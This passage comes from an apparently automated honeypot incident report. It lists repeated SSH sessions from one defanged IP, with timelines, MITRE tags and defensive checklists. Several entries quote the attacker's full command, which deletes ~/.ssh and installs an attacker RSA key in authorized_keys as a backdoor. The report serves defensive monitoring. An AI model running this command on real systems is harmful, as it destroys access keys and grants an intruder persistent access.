- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c998820cccb8

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-04-30 11:19 |
| **Last Seen** | 2026-04-30 11:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 11:19:07` | `cowrie.session.connect` |
| `2026-04-30 11:19:07` | `cowrie.client.version` |
| `2026-04-30 11:19:07` | `cowrie.client.kex` |
| `2026-04-30 11:19:08` | `cowrie.login.success` |
| `2026-04-30 11:19:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b657732d435

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-04-30 11:21 |
| **Last Seen** | 2026-04-30 11:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 11:21:10` | `cowrie.session.connect` |
| `2026-04-30 11:21:11` | `cowrie.client.version` |
| `2026-04-30 11:21:11` | `cowrie.client.kex` |
| `2026-04-30 11:21:12` | `cowrie.login.success` |
| `2026-04-30 11:21:12` | `cowrie.session.params` |
| `2026-04-30 11:21:12` | `cowrie.command.input` |
| `2026-04-30 11:21:12` | `cowrie.command.failed` |
| `2026-04-30 11:21:12` | `cowrie.log.closed` |
| `2026-04-30 11:21:13` | `cowrie.session.params` |
| `2026-04-30 11:21:13` | `cowrie.command.input` |
| `2026-04-30 11:21:13` | `cowrie.session.file_download` |
| `2026-04-30 11:21:13` | `cowrie.log.closed` |
| `2026-04-30 11:21:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48e36def71d7

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-04-30 11:21 |
| **Last Seen** | 2026-04-30 11:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 11:21:16` | `cowrie.session.connect` |
| `2026-04-30 11:21:16` | `cowrie.client.version` |
| `2026-04-30 11:21:16` | `cowrie.client.kex` |
| `2026-04-30 11:21:17` | `cowrie.login.success` |
| `2026-04-30 11:21:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78543fb99e2d

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-04-30 11:23 |
| **Last Seen** | 2026-04-30 11:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 11:23:22` | `cowrie.session.connect` |
| `2026-04-30 11:23:22` | `cowrie.client.version` |
| `2026-04-30 11:23:22` | `cowrie.client.kex` |
| `2026-04-30 11:23:23` | `cowrie.login.success` |
| `2026-04-30 11:23:24` | `cowrie.session.params` |
| `2026-04-30 11:23:24` | `cowrie.command.input` |
| `2026-04-30 11:23:24` | `cowrie.command.failed` |
| `2026-04-30 11:23:24` | `cowrie.log.closed` |
| `2026-04-30 11:23:24` | `cowrie.session.params` |
| `2026-04-30 11:23:24` | `cowrie.command.input` |
| `2026-04-30 11:23:25` | `cowrie.session.file_download` |
| `2026-04-30 11:23:25` | `cowrie.log.closed` |
| `2026-04-30 11:23:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c5e01d0d230

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-04-30 11:23 |
| **Last Seen** | 2026-04-30 11:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 11:23:28` | `cowrie.session.connect` |
| `2026-04-30 11:23:28` | `cowrie.client.version` |
| `2026-04-30 11:23:28` | `cowrie.client.kex` |
| `2026-04-30 11:23:29` | `cowrie.login.success` |
| `2026-04-30 11:23:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-443c176e772a

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-04-30 11:26 |
| **Last Seen** | 2026-04-30 11:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 11:26:40` | `cowrie.session.connect` |
| `2026-04-30 11:26:40` | `cowrie.client.version` |
| `2026-04-30 11:26:40` | `cowrie.client.kex` |
| `2026-04-30 11:26:41` | `cowrie.login.success` |
| `2026-04-30 11:26:42` | `cowrie.session.params` |
| `2026-04-30 11:26:42` | `cowrie.command.input` |
| `2026-04-30 11:26:42` | `cowrie.command.failed` |
| `2026-04-30 11:26:42` | `cowrie.log.closed` |
| `2026-04-30 11:26:42` | `cowrie.session.params` |
| `2026-04-30 11:26:42` | `cowrie.command.input` |
| `2026-04-30 11:26:43` | `cowrie.session.file_download` |
| `2026-04-30 11:26:43` | `cowrie.log.closed` |
| `2026-04-30 11:26:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03ba0119cb7e

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-04-30 11:26 |
| **Last Seen** | 2026-04-30 11:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 11:26:46` | `cowrie.session.connect` |
| `2026-04-30 11:26:46` | `cowrie.client.version` |
| `2026-04-30 11:26:46` | `cowrie.client.kex` |
| `2026-04-30 11:26:47` | `cowrie.login.success` |
| `2026-04-30 11:26:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-204680c0b3ea

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-04-30 11:28 |
| **Last Seen** | 2026-04-30 11:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 11:28:52` | `cowrie.session.connect` |
| `2026-04-30 11:28:52` | `cowrie.client.version` |
| `2026-04-30 11:28:52` | `cowrie.client.kex` |
| `2026-04-30 11:28:53` | `cowrie.login.success` |
| `2026-04-30 11:28:54` | `cowrie.session.params` |
| `2026-04-30 11:28:54` | `cowrie.command.input` |
| `2026-04-30 11:28:54` | `cowrie.command.failed` |
| `2026-04-30 11:28:54` | `cowrie.log.closed` |
| `2026-04-30 11:28:54` | `cowrie.session.params` |
| `2026-04-30 11:28:54` | `cowrie.command.input` |
| `2026-04-30 11:28:55` | `cowrie.session.file_download` |
| `2026-04-30 11:28:55` | `cowrie.log.closed` |
| `2026-04-30 11:28:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7496ef5173f

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-04-30 11:28 |
| **Last Seen** | 2026-04-30 11:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 11:28:58` | `cowrie.session.connect` |
| `2026-04-30 11:28:58` | `cowrie.client.version` |
| `2026-04-30 11:28:58` | `cowrie.client.kex` |
| `2026-04-30 11:28:59` | `cowrie.login.success` |
| `2026-04-30 11:28:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2ff8112f7e6

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-04-30 11:29 |
| **Last Seen** | 2026-04-30 11:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 11:29:59` | `cowrie.session.connect` |
| `2026-04-30 11:29:59` | `cowrie.client.version` |
| `2026-04-30 11:29:59` | `cowrie.client.kex` |
| `2026-04-30 11:30:00` | `cowrie.login.success` |
| `2026-04-30 11:30:00` | `cowrie.session.params` |
| `2026-04-30 11:30:00` | `cowrie.command.input` |
| `2026-04-30 11:30:00` | `cowrie.command.failed` |
| `2026-04-30 11:30:01` | `cowrie.log.closed` |
| `2026-04-30 11:30:01` | `cowrie.session.params` |
| `2026-04-30 11:30:01` | `cowrie.command.input` |
| `2026-04-30 11:30:01` | `cowrie.session.file_download` |
| `2026-04-30 11:30:01` | `cowrie.log.closed` |
| `2026-04-30 11:30:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7420fed10351

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-04-30 11:30 |
| **Last Seen** | 2026-04-30 11:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 11:30:04` | `cowrie.session.connect` |
| `2026-04-30 11:30:05` | `cowrie.client.version` |
| `2026-04-30 11:30:05` | `cowrie.client.kex` |
| `2026-04-30 11:30:06` | `cowrie.login.success` |
| `2026-04-30 11:30:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a5e8a527029

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-04-30 11:32 |
| **Last Seen** | 2026-04-30 11:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 11:32:14` | `cowrie.session.connect` |
| `2026-04-30 11:32:14` | `cowrie.client.version` |
| `2026-04-30 11:32:14` | `cowrie.client.kex` |
| `2026-04-30 11:32:15` | `cowrie.login.success` |
| `2026-04-30 11:32:16` | `cowrie.session.params` |
| `2026-04-30 11:32:16` | `cowrie.command.input` |
| `2026-04-30 11:32:16` | `cowrie.command.failed` |
| `2026-04-30 11:32:16` | `cowrie.log.closed` |
| `2026-04-30 11:32:17` | `cowrie.session.params` |
| `2026-04-30 11:32:17` | `cowrie.command.input` |
| `2026-04-30 11:32:17` | `cowrie.session.file_download` |
| `2026-04-30 11:32:17` | `cowrie.log.closed` |
| `2026-04-30 11:32:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73cec93f1d7d

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-04-30 11:32 |
| **Last Seen** | 2026-04-30 11:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 11:32:20` | `cowrie.session.connect` |
| `2026-04-30 11:32:20` | `cowrie.client.version` |
| `2026-04-30 11:32:20` | `cowrie.client.kex` |
| `2026-04-30 11:32:21` | `cowrie.login.success` |
| `2026-04-30 11:32:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36d06a06b01e

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-04-30 11:33 |
| **Last Seen** | 2026-04-30 11:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 11:33:22` | `cowrie.session.connect` |
| `2026-04-30 11:33:22` | `cowrie.client.version` |
| `2026-04-30 11:33:22` | `cowrie.client.kex` |
| `2026-04-30 11:33:23` | `cowrie.login.success` |
| `2026-04-30 11:33:23` | `cowrie.session.params` |
| `2026-04-30 11:33:23` | `cowrie.command.input` |
| `2026-04-30 11:33:23` | `cowrie.command.failed` |
| `2026-04-30 11:33:24` | `cowrie.log.closed` |
| `2026-04-30 11:33:24` | `cowrie.session.params` |
| `2026-04-30 11:33:24` | `cowrie.command.input` |
| `2026-04-30 11:33:24` | `cowrie.session.file_download` |
| `2026-04-30 11:33:24` | `cowrie.log.closed` |
| `2026-04-30 11:33:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92df73c255f3

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-04-30 11:33 |
| **Last Seen** | 2026-04-30 11:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 11:33:27` | `cowrie.session.connect` |
| `2026-04-30 11:33:27` | `cowrie.client.version` |
| `2026-04-30 11:33:28` | `cowrie.client.kex` |
| `2026-04-30 11:33:29` | `cowrie.login.success` |
| `2026-04-30 11:33:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1ae3a6009a9

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-04-30 11:34 |
| **Last Seen** | 2026-04-30 11:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 11:34:29` | `cowrie.session.connect` |
| `2026-04-30 11:34:29` | `cowrie.client.version` |
| `2026-04-30 11:34:29` | `cowrie.client.kex` |
| `2026-04-30 11:34:30` | `cowrie.login.success` |
| `2026-04-30 11:34:31` | `cowrie.session.params` |
| `2026-04-30 11:34:31` | `cowrie.command.input` |
| `2026-04-30 11:34:31` | `cowrie.command.failed` |
| `2026-04-30 11:34:31` | `cowrie.log.closed` |
| `2026-04-30 11:34:31` | `cowrie.session.params` |
| `2026-04-30 11:34:31` | `cowrie.command.input` |
| `2026-04-30 11:34:32` | `cowrie.session.file_download` |
| `2026-04-30 11:34:32` | `cowrie.log.closed` |
| `2026-04-30 11:34:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92df943f7595

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-04-30 11:34 |
| **Last Seen** | 2026-04-30 11:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 11:34:35` | `cowrie.session.connect` |
| `2026-04-30 11:34:35` | `cowrie.client.version` |
| `2026-04-30 11:34:35` | `cowrie.client.kex` |
| `2026-04-30 11:34:36` | `cowrie.login.success` |
| `2026-04-30 11:34:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfb14ee13f79

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-04-30 11:36 |
| **Last Seen** | 2026-04-30 11:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
